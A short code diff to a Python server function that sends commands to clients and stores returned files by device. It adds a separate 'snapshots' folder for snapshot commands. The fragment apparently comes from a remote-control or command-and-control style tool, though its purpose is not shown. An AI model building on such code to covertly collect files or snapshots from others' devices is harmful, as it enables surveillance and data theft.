@@ -339,7 +339,10 @@ def send_command_to_client(client_id, command, save_path=None):
                         filepath = save_path
                         os.makedirs(os.path.dirname(filepath), exist_ok=True)
                     else:
-                        downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
+                        if command.startswith("snapshot"):
+                            downloads_dir = os.path.join(os.path.dirname(__file__), 'snapshots')
+                        else:
+                            downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
                         sys_info = clients.get(client_id, {}).get('sys_info', '') or 'unknown_device'
                         device_dir = os.path.join(downloads_dir, sys_info)
                         os.makedirs(device_dir, exist_ok=True)
